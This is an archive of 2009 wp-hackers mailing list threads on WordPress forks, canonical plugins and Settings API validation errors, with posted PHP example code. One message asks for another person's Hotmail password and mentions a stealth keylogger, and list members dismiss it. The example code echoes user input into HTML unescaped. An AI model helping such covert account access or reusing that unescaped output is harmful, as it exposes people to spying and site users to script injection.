the reactor!</strong></p></div>
//   unset $_GET['updated']
// }
} // end function

That should do the trick.

-Otto

From lists.automattic.com at callum-macdonald.com  Thu Dec 17 16:46:27 2009
From: lists.automattic.com at callum-macdonald.com (Callum Macdonald)
Date: Thu, 17 Dec 2009 10:46:27 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
Message-ID: <1261068387.8378.85.camel@buna>

Holamigos,

Instigated in part by recent discussion on ticket 5066[1], I think the
time has come to create a few WordPress forks. I'm imagining a set of
patches applied against core rolled into a tgz. I can see a few initial
options:
* Strip out all the update checking stuff
* Anonymize update checking
* Security focused patches
* Remove post revisions, etc...

I'm sure other people will have their own particular choices.
Personally, I'd like to see a tin foil flavour of WordPress with ultra
conservative privacy settings. :-)

Rather than create a single fork, I propose to create wpflavours (or
maybe wpflavors), a project to provide the means to maintain multiple
WordPress flavours. I'm seeing an svn repo, patches (maybe using
quilt[2]) and a mailing list.

I've started a discussion[3]. If you're interested in contributing, let
me know. I'll most likely only proceed if there is sufficient interest
in maintaining patch sets.

Warmly - Callum.

[1] http://core.trac.wordpress.org/ticket/5066
[2] http://savannah.nongnu.org/projects/quilt
[3] http://www.callum-macdonald.com/2009/12/17/proposing-wp-flavours/



From harish.mlists at gmail.com  Thu Dec 17 17:12:49 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Thu, 17 Dec 2009 17:12:49 +0000
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <4B2A6585.90103@gmail.com>
References: <1261068387.8378.85.camel@buna> <4B2A6585.90103@gmail.com>
Message-ID: <4c95b6c20912170912mf90ac53id044a65193794cf8@mail.gmail.com>

On 17/12/2009 16:46, Callum Macdonald wrote:
> Holamigos,
>
> Instigated in part by recent discussion on ticket 5066[1], I think the
> time has come to create a few WordPress forks. I'm imagining a set of
> patches applied against core rolled into a tgz. I can see a few initial
> options:
> * Strip out all the update checking stuff
> * Anonymize update checking
> * Security focused patches
> * Remove post revisions, etc...
>
> I'm sure other people will have their own particular choices.
> Personally, I'd like to see a tin foil flavour of WordPress with ultra
> conservative privacy settings. :-)
>
> Rather than create a single fork, I propose to create wpflavours (or
> maybe wpflavors), a project to provide the means to maintain multiple
> WordPress flavours. I'm seeing an svn repo, patches (maybe using
> quilt[2]) and a mailing list.
>
> I've started a discussion[3]. If you're interested in contributing, let
> me know. I'll most likely only proceed if there is sufficient interest
> in maintaining patch sets.

I haven't any opinions on the specific flavours mentioned, but I have
one thing to add to this discussion. I have been part of a few Free
Software projects that recently migrated their development
repositories to Bazaar[1] and launchpad[2]. (The specific choices are
not important to the discussion, but the capabilities these choices
provide are.)

This was supposed to be an infrastructural change, but it had some
unintended, interesting and useful consequences. Because
branching/merging was now easily possible[3], people who had cool
ideas of their own maintained a branch (or a fork, or a parallel
version of the tree, however you prefer to call it) containing their
own experiments and pet features. Then, other curious people would
check these features (flavours, in Callum's words), and the clearly
useful changes would be merged back into the arbitrarily decreed
"primary tree."

I think considering such a development process will allow for a lot of things:

* Allowing people to easily implement and publicise their own pet
features and ideas.
* Allow others to easily try out these implementations.
* Doesn't require maintaining sets of patches Callum proposed.
* Allows the "primary project branch" to easily pull in important,
useful and cool changes from these offshoots.

If someone is interested in seeing this in action, I can set up a
mirror to the WordPress source repository on a hosted site (e.g.
launchpad, github, bitbucket, ...). Others can branch/fork/clone/...
this and maintain their pet features.

Harish


[1] http://bazaar.canonical.com/en/
[2] https://launchpad.net/
[3] It is possible in svn as well, but most big outfits tend to have a
centralised development repository much like WordPress does,
discouraging it. In comparison, check out the number of parallel
branches for a project like MySQL https://code.launchpad.net/mysql .

From Ken at adcSTUDIO.com  Thu Dec 17 17:32:00 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Thu, 17 Dec 2009 12:32:00 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <1261068387.8378.85.camel@buna>
References: <1261068387.8378.85.camel@buna>
Message-ID: <4B2A6B10.6060201@adcSTUDIO.com>

On 12/17/2009 11:46 AM, Callum Macdonald wrote:
> Instigated in part by recent discussion on ticket 5066[1], I think the
> time has come to create a few WordPress forks. I'm imagining a set of
> patches applied against core rolled into a tgz. I can see a few initial
> options:
> * Strip out all the update checking stuff
> * Anonymize update checking
> * Security focused patches
> * Remove post revisions, etc...
>
> ...
>
> Rather than create a single fork, I propose to create wpflavours (or
> maybe wpflavors), a project to provide the means to maintain multiple
> WordPress flavours. I'm seeing an svn repo, patches (maybe using
> quilt[2]) and a mailing list.
>    
Hello,

I think that the privacy concerns are largely address by a declaration 
that WP does phone home and why that's desirable, and with a link to 
http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/ 
for those that need to disable checks on sensitive data.

As far as forks go, I don't really think that's needed if the Canonical 
Plugins are used instead. Lots of functionality some would like added to 
core can (shortly) do so with canonical plugins.

Additionally, Functionality that some would like **removed** from the 
core could be likewise dealt with in a canonical plugin. This goes for 
non-privacy related functionality like:

   1. Code Editors for Themes and Plugins: Some people hate this and
      want it out of core, some like it tho; would make a good canonical
      plugin.
   2. The new Image Editing Functionality: Some think it adds to much
      bloat and functionality is too niche. Others absolutely love it. I
      think it should be a canonical plugin, but installed and activated
      by default.
   3. TinyMCE or LightBox: I'm using these as illustrating examples.
      Making these canonical plugins, with other versions, Colorbox or
      the text editor from google (whatever) would provide a smoother
      changing out of functionality. These wouldn't be able to be turned
      off without a substitute, which is why I included it here for
      consideration.

I bring this up because I'm not sure if its been considered how 
canonical plugins can be for moving out core functionality as well as 
bringing in existing plugins as canon.

Its also a better way to go then forking I believe.

Thanks,
Ken

From william.canino at googlemail.com  Thu Dec 17 20:19:46 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 17 Dec 2009 15:19:46 -0500
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
In-Reply-To: <4B2A6B10.6060201@adcSTUDIO.com>
References: <1261068387.8378.85.camel@buna> <4B2A6B10.6060201@adcSTUDIO.com>
Message-ID: <e4dc67e0912171219x7183a3fagfcb5d1cbd3a820d@mail.gmail.com>

Considering its thousands of action and filter hooks -- and more and
more made in each release, in my opinion, WordPress is too
customizable and open-ended to need particular forks.... that is,
unless a very good programmer (or a group of them) comes up with a
direction for WordPress that the lead devs (Boren, Jacquith,
Mullenweg, Ozz and Westwood) feel strongly against.

Realistically, the lead devs cannot allow/approve every kind of patch
that will be suggested that disables features or takes WordPress in
every sort of direction.  While a plugin developer might say, "Hello,
here is a one-line diff that will let WordPress handle Foobar content,
I think people will find it useful," if the trac discussion says
wont-fix, it's a wont-fix.  I can see how the wont-fix feels to the
plugin developer; the word "fork" will come to her mind.

I haven't yet worked with WP Core closely to see how open-minded or
politically-heated trac discussions get. To Foobar plugin developers:
go right ahead anyway, strut your stuff, tell your plugin users to add
that line as an installation step!! Don't ever let anybody tell you
your idea isn't worth shit.

Thank you for letting me speak.

W.

2009/12/17 Ken Newman <Ken at adcstudio.com>:
> On 12/17/2009 11:46 AM, Callum Macdonald wrote:
>>
>> Instigated in part by recent discussion on ticket 5066[1], I think the
>> time has come to create a few WordPress forks. I'm imagining a set of
>> patches applied against core rolled into a tgz. I can see a few initial
>> options:
>> * Strip out all the update checking stuff
>> * Anonymize update checking
>> * Security focused patches
>> * Remove post revisions, etc...
>>
>> ...
>>
>> Rather than create a single fork, I propose to create wpflavours (or
>> maybe wpflavors), a project to provide the means to maintain multiple
>> WordPress flavours. I'm seeing an svn repo, patches (maybe using
>> quilt[2]) and a mailing list.
>>
>
> Hello,
>
> I think that the privacy concerns are largely address by a declaration that
> WP does phone home and why that's desirable, and with a link to
> http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/
> for those that need to disable checks on sensitive data.
>
> As far as forks go, I don't really think that's needed if the Canonical
> Plugins are used instead. Lots of functionality some would like added to
> core can (shortly) do so with canonical plugins.
>
> Additionally, Functionality that some would like **removed** from the core
> could be likewise dealt with in a canonical plugin. This goes for
> non-privacy related functionality like:
>
> ?1. Code Editors for Themes and Plugins: Some people hate this and
> ? ? want it out of core, some like it tho; would make a good canonical
> ? ? plugin.
> ?2. The new Image Editing Functionality: Some think it adds to much
> ? ? bloat and functionality is too niche. Others absolutely love it. I
> ? ? think it should be a canonical plugin, but installed and activated
> ? ? by default.
> ?3. TinyMCE or LightBox: I'm using these as illustrating examples.
> ? ? Making these canonical plugins, with other versions, Colorbox or
> ? ? the text editor from google (whatever) would provide a smoother
> ? ? changing out of functionality. These wouldn't be able to be turned
> ? ? off without a substitute, which is why I included it here for
> ? ? consideration.
>
> I bring this up because I'm not sure if its been considered how canonical
> plugins can be for moving out core functionality as well as bringing in
> existing plugins as canon.
>
> Its also a better way to go then forking I believe.
>
> Thanks,
> Ken
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From carlos_nunes42 at hotmail.co.uk  Thu Dec 17 20:45:52 2009
From: carlos_nunes42 at hotmail.co.uk (carlos nunes)
Date: Thu, 17 Dec 2009 20:45:52 +0000
Subject: [wp-hackers] =?iso-8859-1?q?=B4=B4i_need_urgente_a_password_of_a_?=
 =?iso-8859-1?q?hotmail_can_anybody_help_me=3F=B4=B4?=
Message-ID: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>


HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO MANY SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST NEED THE PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND THEN I GET OUT PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT PERSONA CAN YOU HELP ME?


THANKS BEST REGARDS

CARLOS
 		 	   		  
_________________________________________________________________
Windows Live Hotmail: Your friends can get your Facebook updates, right from Hotmail?.
http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009

From wordpress at dd32.id.au  Thu Dec 17 20:55:20 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 18 Dec 2009 07:55:20 +1100
Subject: [wp-hackers]
 =?utf-8?q?=C2=B4=C2=B4i_need_urgente_a_password_of_a?=
 =?utf-8?q?_hotmail_can_anybody_help_me=3F=C2=B4=C2=B4?=
In-Reply-To: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>
References: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>
Message-ID: <op.u43oeea6spxmuu@dd32>

Please be advised that this is a -WordPress- discussion mailing list  
designed for -Hackers-. Please see  
http://en.wikipedia.org/wiki/Hacker_(programmer_subculture) for a  
explanation of the term -Hacker-
This list does not contain (Or it may, But its not for it) anyone who can  
help you with your stupid non-programming needs.

On Fri, 18 Dec 2009 07:45:52 +1100, carlos nunes  
<carlos_nunes42 at hotmail.co.uk> wrote:

>
> HI GOOD EVENING I NEED A PERSON HOTMAIL PASSWORD, I MEAN I THINK THAT  
> PERSON IS CHEATING ON ME SO IF YOU CAN HELP ME CAUSE I ALLREDY TRIED SO  
> MANY SOFTWARE LIKE PERFECT KEYLOOGER WICH GOT STEALTH MODE AND I JUST  
> NEED THE PASSWORD OF THAT PERSON ONCE I GET IT I JUST TAKE A LOOK AND  
> THEN I GET OUT PLEASE I REAL NEED IT IF I SENT YOU THE EMAIL OF THAT  
> PERSONA CAN YOU HELP ME?
>
>
> THANKS BEST REGARDS
>
> CARLOS
>  		 	   		
> _________________________________________________________________
> Windows Live Hotmail: Your friends can get your Facebook updates, right  
> from Hotmail?.
> http://www.microsoft.com/middleeast/windows/windowslive/see-it-in-action/social-network-basics.aspx?ocid=PID23461::T:WLMTAGL:ON:WL:en-xm:SI_SB_4:092009
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From jer at simianuprising.com  Thu Dec 17 21:00:26 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 17 Dec 2009 16:00:26 -0500
Subject: [wp-hackers] Settings API: Showing errors if validation fails
In-Reply-To: <9dd057850912162318h265eed11g18903c2b1b596849@mail.gmail.com>
References: <e1202cb10912161523u766e07a5xfcd2f5096ddc6226@mail.gmail.com>
	<9dd057850912162318h265eed11g18903c2b1b596849@mail.gmail.com>
Message-ID: <e1202cb10912171300p33d1478ch2cb36b12f19f5c2b@mail.gmail.com>

On Thu, Dec 17, 2009 at 2:18 AM, Ade Walker <photofantaisie at gmail.com> wrote:
>
> I ended up using two functions: the register_settings callback function just
> to sanitise the user input and a separate validation function to recheck
> what's been entered and generate error messages if necessary. The validation
> function is called each time the Settings page is loaded. As for the Reset
> message, I have ended up with a rather clunky (or so it seems to me) method,
> which involves a hidden option called "just-reset". This is captured in the
> $input array and, if "true", $input is replaced with the default settings,
> and $input['just-reset'] is set to true (all options are kept in one array,
> which is the reason for this), and then the $input array is returned. I then
> have another function hooked to admin_notices which checks if the
> $options['just-reset'] is true and, if so, prints out a "You've reset your
> settings to default" message, then changes $options['just-reset'] to false,
> and then runs update_option. It's probably easier to follow me if you look
> at the source code of the plugin in question, :-/

Yeah I see what you mean and that is a good idea. During validation I
can set up a $option['messages'] sub-array before passing back the
full settings array, then in admin_notices I check for it and erase
its values after displaying the messages.

It's annoying (mostly conceptually) to have to re-save the option
after returning to your settings page but at least it doesn't involve
re-validating all the data or much code duplication. This is probably
a good interim solution for people who need it. Thanks.

I worked out this system in my own code last night so I'll post it
here for anyone interested. I ended up preferring to avoid
admin_notices and leave it alone. The settings updated message still
makes sense in case there were other settings that were saved, and I
just plain like the look of the errors under my settings page heading
and intro text:

PASTE w/ SYNTAX COLORING: http://pastie.org/747439

I'll paste the actual php for the interim solution at the bottom of this email.

I also worked out exactly what would be necessary to fix this in core
and what I think is a workable solution for adding error messaging to
the Settings API. You can read a novel worth of it on the trac ticket:
http://core.trac.wordpress.org/ticket/11474

One part I think is particularly relevant to wp-hackers:
--------------
This missing feature is a huge defect of the Settings API because it
gives no sane way for eager developers to add errors to their own
settings sections/pages, but also because it fails to inspire them to
do so with an elegant framework. IMHO error reporting to users should
be a first-class citizen of the Settings API, and pushing error
reporting in the faces of developers will cause an overall usability
improvement for ALL WordPress plugins, not just those who's authors
were already concerned about reporting validation errors.

Put another way: Usability improvements to the Settings API through
easy error reporting should be treated like security improvements
through mandatory validation functions: Both are functionalities that
remind/inspire developers to do what they should be doing anyway, but
often forget about/don't think to do on their own.
--------------

I'm interested in feedback on the API addition on any level, but one
particularly interesting question is how to refer to them. I'm not
sure if there is a standard elsewhere in WP-Land to follow.

For functions and global variables I think it should be referred to as
either 'settings_errors' or 'settings_messages'. I.e.

add_settings_error();
settings_errors();
global $wp_settings_errors;

OR

add_settings_mesages();
settings_messages();
global $wp_settings_messages;

In either case I think the API should allow for different $types like
'error', 'updated' and maybe others. To me this implies that
*_messages should be used as the suffix so it will be completely
accurate.

That said, I personally find *_errors to be a lot more obvious in
terms of what it does. Any developer who saw add_settings_error()
would probably be able to figure out what would happen if you used it,
while add_settings_message() might be more confusing. People don't
think of the word "messaging" when they think of input validation (or
maybe I just don't).

Interested to hear thoughts :)

--
Jeremy Clarke | http://jeremyclarke.org
Code and Design | globalvoicesonline.org


---------------------------------------------------------------------------------------
INTERIM SETTINGS VALIDATION ERRORS CODE FOR FUTURE EXPLORERS:
---------------------------------------------------------------------------------------

/**
?* Validation callback for all of 'gv_settings' option.
?*
?* Referenced in register_setting() for gv_settings, runs whenever
update_option('gv_settings') is used.
?* Must account for every field added to gv_settings via add_settings_field
?*
?* @param array $input Full array of data passed into update_option()
?* @return array Sanitized array of data
?*/
function gv_settings_validate($input){
??? global $gv;

??? /**
??? ?* Validate an email address
??? ?*/
??? $email = sanitize_email( $input['email'] );
??? // If its valid add the email to the output array
??? if ( $email AND is_email( $email ) ) :
??? ??? $output['email'] = $email;
??? // Otherwise add a message with a slug and text value to be output
on the settings page
??? elseif ( $input['email'] ) :
??? ??? $messages['email_error'] = "Email Error: The 'email address'
given, <strong>" . $input['email'] . " </strong> is not a valid
email";
??? endif;

??? /**
??? ?* Validate a page id
??? ?*/
??? if ($input['special_page_id']) :
??? ??? $page_object = get_page( $input['special_page_id'] );
??? ??? // Make sure a valid page object was returned.
??? ??? if ( is_object( $page_object ) AND !is_wp_error($page_object) )
??? ??? ??? $output['special_page_id'] = $input['special_page_id'];
??? ??? else
??? ??? ??? $messages['page_id_error'] = "Page ID Error: The page id
given, <strong>" . $input['special_page_id'] . " </strong> is not a
page on this site";
??? endif;

??? /**
??? ?* Add any messages to the array
??? ?*/
??? if (is_array($messages))
??? ??? ?$output['messages'] = $messages;

??? /**
??? ?* Return the array of new values
??? ?*/
??? return $output;
}

/**
?* Show any messages/errors saved to a setting during automated validation
?*
?* Needed because validation system has no error reporting.
?* Uses a ['messages'] array inside the settings array
?* Format should be ['messages'][$slug][$message_text], $slug is
unique id, $message is just text.
?*
?* @param string $setting The setting name as used in get_option()
?*/
function gv_settings_display_errors($setting) {
??? $option = get_option($setting);
??? if (is_array($option['messages'])) :
??? ??? foreach ( (array) $option['messages'] as $slug => $message) :
??? ??? ??? echo "<div id='gv_messages' class='error fade
$slug'><p>$message</p></div>";
??? ??? ??? unset($option['messages'][$slug]);
??? ??? endforeach;
??? ??? update_option('gv_settings', $option);
??? endif;
}

/**
?* Page display function for GV Settings
?*
?* Defined during gv_add_settings_pages()
?*/
function gv_settings_page() {
??? ?>
??? <div>
??? ??? <h2><?php _e('Global Voices Settings'); ?></h2>
??? ??? <p>
??? ??? ??? These settings are related specifically to Global Voices
sites and the gv-plugin plugin.
??? ??? ??? They cover various specific and general functionality
added by gv-plugin.
??? ??? </p>

??? ??? <?php
                // HERE IT IS: DISPLAY ANY SETTINGS WE HAVE IN OUR OPTION ARRAY
                gv_settings_display_errors('gv_settings');
        ?>

??? ??? <form action="options.php" method="post">
??? ??? ??? <p class="submit"><input type="submit" name="submit"
value="<?php _e('Update options &raquo;'); ?>" /></p>
??? ??? ??? <?php
??? ??? ??? // Output fundamental security etc. form fields
??? ??? ??? settings_fields('gv_settings');
??? ??? ??? // Output any sections defined for page gv_settings
??? ??? ??? do_settings_sections('gv_settings');
??? ??? ??? ?>
??? ??? ??? <p class="submit"><input type="submit" name="submit"
value="<?php _e('Update options &raquo;'); ?>" /></p>
??? ??? </form>
??? </div>
??? <?php
}

From zamoose at gmail.com  Thu Dec 17 21:41:13 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 17 Dec 2009 16:41:13 -0500
Subject: [wp-hackers]
	=?iso-8859-1?q?=B4=B4i_need_urgente_a_password_of_a_?=
	=?iso-8859-1?q?hotmail_can_anybody_help_me=3F=B4=B4?=
In-Reply-To: <op.u43oeea6spxmuu@dd32>
References: <BAY119-W49234FD0A7854ECE2A98FA8860@phx.gbl>
	<op.u43oeea6spxmuu@dd32>
Message-ID: <71ddd7490912171341r2719140epbc465e6875ae2dbd@mail.gmail.com>

One does find oneself wondering what, precisely, a "KEYLOOGER" is.

*grin*

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From chicagowebdev at gmail.com  Thu Dec 17 23:28:20 2009
From: chicagowebdev at gmail.com (Jean-Patrick Smith)
Date: Thu, 17 Dec 2009 17:28:20 -0600
Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
	(Jean-Patrick Smith)
Message-ID: <f44b36190912171528n42bf7747p6e41df7bf91bb6@mail.gmail.com>

I'd like to see a wordpress fork geared more towards a CMS, with the
friendly backend and file-based templating system.

Extend the widget functionality, making them more like Drupals blocks w/ CCK
and views, and i'd never use Drupal again...

PodsCMS does this, but if you could fork wordpress and make PodsCMS a core
feature, it'd be interesting to see where that went.


On Thu, Dec 17, 2009 at 2:55 PM, <wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: [ wp-hackers ] wp _ enqueue _ script() not working while
>      in the Loop (TobiasBg)
>   2. Re: [ wp-hackers ] wp _ enqueue _ script() not working    while
>      in the Loop (scribu)
>   3. Re: Settings API: Showing errors if validation fails (Otto)
>   4. Proposing WP Flavours (various WordPress forks) (Callum Macdonald)
>   5. Re: Proposing WP Flavours (various WordPress forks)
>      (Harish Narayanan)
>   6. Re: Proposing WP Flavours (various WordPress forks) (Ken Newman)
>   7. Re: Proposing WP Flavours (various WordPress forks)
>      (William Canino)
>   8. ??i need urgente a password of a hotmail can anybody help
>      me??? (carlos nunes)
>   9. Re: ??i need urgente a password of a hotmail can anybody help
>      me??? (Dion Hulse (dd32))
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Thu, 17 Dec 2009 13:46:39 +0100 (CET)
> From: "TobiasBg"<wp-hackers at tobias.baethge.com>
> Subject: Re: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not
>        working while in the Loop
> To: wp-hackers at lists.automattic.com
> Message-ID: <20091217124639.5C6C3181B04D1 at dd19416.kasserver.com>
> Content-Type: text/plain; charset="utf-8"
>
> Hi,
>
> > That's why I use $wp_scripts->do_items(). It makes sure the same script
> > isn't included twice. You just have to make sure you use the same handle
> for
> > both plugins.
>
> Argh, stupid me. Of course it does (and so does its wrapper
> wp_print_scripts, that I prefer to use). I just had a typo in one of the
> handles... Thanks for pointing me to it!
>
> I guess, I'll just leave this alone for today and go out and do some ...
> Christmas Shopping! :-)
>
> Regards,
> Tobias
>
>
>
>
>
> ------------------------------
>
> Message: 2
> Date: Thu, 17 Dec 2009 17:03:49 +0200
> From: scribu <scribu at gmail.com>
> Subject: Re: [wp-hackers] [ wp-hackers ] wp _ enqueue _ script() not
>        working while in the Loop
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <349fe48b0912170703l29937a07i517fc54417b4ef04 at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
>  You're welcome. :)
>
> I don't use wp_print_scripts() because some other plugins might have inline
> scripts printed using the 'wp_print_scripts' hook.
>
>
> On Thu, Dec 17, 2009 at 2:46 PM, TobiasBg <wp-hackers at tobias.baethge.com
> >wrote:
>
> > Hi,
> >
> > > That's why I use $wp_scripts->do_items(). It makes sure the same script
> > > isn't included twice. You just have to make sure you use the same
> handle
> > for
> > > both plugins.
> >
> > Argh, stupid me. Of course it does (and so does its wrapper
> > wp_print_scripts, that I prefer to use). I just had a typo in one of the
> > handles... Thanks for pointing me to it!
> >
>
>
> --
> http://scribu.net
>
>
> ------------------------------
>
> Message: 3
> Date: Thu, 17 Dec 2009 09:05:11 -0600
> From: Otto <otto at ottodestruct.com>
> Subject: Re: [wp-hackers] Settings API: Showing errors if validation
>        fails
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <161617690912170705r449ed407p8eeefc7caa822742 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> You could use the admin_notices hook to generate your own error
> messages based on whatever you like.
>
> Basically, hook a function to admin_notices. In this function, you
> need to check for your error case and generate output based on it.
> Then, you can unset $_GET['updated'] to prevent the Settings saved
> message from showing up.
>
> Basically something like this:
>
> 1. On error detection, save the error somewhere that you can pick it
> up later. Like an option, or a transient, or something.
>
> 2. On the admin_notices hooked function:
>
> if ($parent_file == 'options-general.php' && $_GET['page'] ==
> 'my-plugin-page') {
> // check the plugin option for errors
> // found some errors? If so, then {
> <div id="message" class="updated fade"><p><strong>No! You'll overload
> the reactor!</strong></p></div>
> //   unset $_GET['updated']
> // }
> } // end function
>
> That should do the trick.
>
> -Otto
>
>
> ------------------------------
>
> Message: 4
> Date: Thu, 17 Dec 2009 10:46:27 -0600
> From: Callum Macdonald <lists.automattic.com at callum-macdonald.com>
> Subject: [wp-hackers] Proposing WP Flavours (various WordPress forks)
> To: wp-hackers at lists.automattic.com
> Message-ID: <1261068387.8378.85.camel at buna>
> Content-Type: text/plain
>
> Holamigos,
>
> Instigated in part by recent discussion on ticket 5066[1], I think the
> time has come to create a few WordPress forks. I'm imagining a set of
> patches applied against core rolled into a tgz. I can see a few initial
> options:
> * Strip out all the update checking stuff
> * Anonymize update checking
> * Security focused patches
> * Remove post revisions, etc...
>
> I'm sure other people will have their own particular choices.
> Personally, I'd like to see a tin foil flavour of WordPress with ultra
> conservative privacy settings. :-)
>
> Rather than create a single fork, I propose to create wpflavours (or
> maybe wpflavors), a project to provide the means to maintain multiple
> WordPress flavours. I'm seeing an svn repo, patches (maybe using
> quilt[2]) and a mailing list.
>
> I've started a discussion[3]. If you're interested in contributing, let
> me know. I'll most likely only proceed if there is sufficient interest
> in maintaining patch sets.
>
> Warmly - Callum.
>
> [1] http://core.trac.wordpress.org/ticket/5066
> [2] http://savannah.nongnu.org/projects/quilt
> [3] http://www.callum-macdonald.com/2009/12/17/proposing-wp-flavours/
>
>
>
>
> ------------------------------
>
> Message: 5
> Date: Thu, 17 Dec 2009 17:12:49 +0000
> From: Harish Narayanan <harish.mlists at gmail.com>
> Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
>        forks)
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <4c95b6c20912170912mf90ac53id044a65193794cf8 at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> On 17/12/2009 16:46, Callum Macdonald wrote:
> > Holamigos,
> >
> > Instigated in part by recent discussion on ticket 5066[1], I think the
> > time has come to create a few WordPress forks. I'm imagining a set of
> > patches applied against core rolled into a tgz. I can see a few initial
> > options:
> > * Strip out all the update checking stuff
> > * Anonymize update checking
> > * Security focused patches
> > * Remove post revisions, etc...
> >
> > I'm sure other people will have their own particular choices.
> > Personally, I'd like to see a tin foil flavour of WordPress with ultra
> > conservative privacy settings. :-)
> >
> > Rather than create a single fork, I propose to create wpflavours (or
> > maybe wpflavors), a project to provide the means to maintain multiple
> > WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > quilt[2]) and a mailing list.
> >
> > I've started a discussion[3]. If you're interested in contributing, let
> > me know. I'll most likely only proceed if there is sufficient interest
> > in maintaining patch sets.
>
> I haven't any opinions on the specific flavours mentioned, but I have
> one thing to add to this discussion. I have been part of a few Free
> Software projects that recently migrated their development
> repositories to Bazaar[1] and launchpad[2]. (The specific choices are
> not important to the discussion, but the capabilities these choices
> provide are.)
>
> This was supposed to be an infrastructural change, but it had some
> unintended, interesting and useful consequences. Because
> branching/merging was now easily possible[3], people who had cool
> ideas of their own maintained a branch (or a fork, or a parallel
> version of the tree, however you prefer to call it) containing their
> own experiments and pet features. Then, other curious people would
> check these features (flavours, in Callum's words), and the clearly
> useful changes would be merged back into the arbitrarily decreed
> "primary tree."
>
> I think considering such a development process will allow for a lot of
> things:
>
> * Allowing people to easily implement and publicise their own pet
> features and ideas.
> * Allow others to easily try out these implementations.
> * Doesn't require maintaining sets of patches Callum proposed.
> * Allows the "primary project branch" to easily pull in important,
> useful and cool changes from these offshoots.
>
> If someone is interested in seeing this in action, I can set up a
> mirror to the WordPress source repository on a hosted site (e.g.
> launchpad, github, bitbucket, ...). Others can branch/fork/clone/...
> this and maintain their pet features.
>
> Harish
>
>
> [1] http://bazaar.canonical.com/en/
> [2] https://launchpad.net/
> [3] It is possible in svn as well, but most big outfits tend to have a
> centralised development repository much like WordPress does,
> discouraging it. In comparison, check out the number of parallel
> branches for a project like MySQL https://code.launchpad.net/mysql .
>
>
> ------------------------------
>
> Message: 6
> Date: Thu, 17 Dec 2009 12:32:00 -0500
> From: Ken Newman <Ken at adcSTUDIO.com>
> Subject: Re: [wp-hackers] Proposing WP Flavours (various WordPress
>        forks)
> To: wp-hackers at lists.automattic.com
> Message-ID: <4B2A6B10.6060201 at adcSTUDIO.com>
> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>
> On 12/17/2009 11:46 AM, Callum Macdonald wrote:
> > Instigated in part by recent discussion on ticket 5066[1], I think the
> > time has come to create a few WordPress forks. I'm imagining a set of
> > patches applied against core rolled into a tgz. I can see a few initial
> > options:
> > * Strip out all the update checking stuff
> > * Anonymize update checking
> > * Security focused patches
> > * Remove post revisions, etc...
> >
> > ...
> >
> > Rather than create a single fork, I propose to create wpflavours (or
> > maybe wpflavors), a project to provide the means to maintain multiple
> > WordPress flavours. I'm seeing an svn repo, patches (maybe using
> > quilt[2]) and a mailing list.
> >
> Hello,
>
> I think that the privacy concerns are largely address by a declaration
> that WP does phone home and why that's desirable, and with a link to
>
> http://markjaquith.wordpress.com/2009/12/14/excluding-your-plugin-or-theme-from-update-checks/
> for those that need to disable checks on sensitive data.
>
> As far as forks go, I don't really think that's needed if the Canonical
> Plugins are used instead. Lots of functionality some would like added to
> core can (shortly) do so with canonical plugins.
>
> Additionally, Functionality that some would like **removed** from the
> core could be likewise dealt with in a canonical plugin. This goes for
> non-privacy related functionality like:
>
>   1. Code Editors for Themes and Plugins: Some people hate this and
>      want it out of core, some like it tho; would make a good canonical
>      plugin.
>   2. The new Image Editing Functionality: Some think it adds to much
>      bloat and functionality is too niche. Others absolutely love it. I
>      think it should be a canonical plugin, but installed and activated
>      by default.
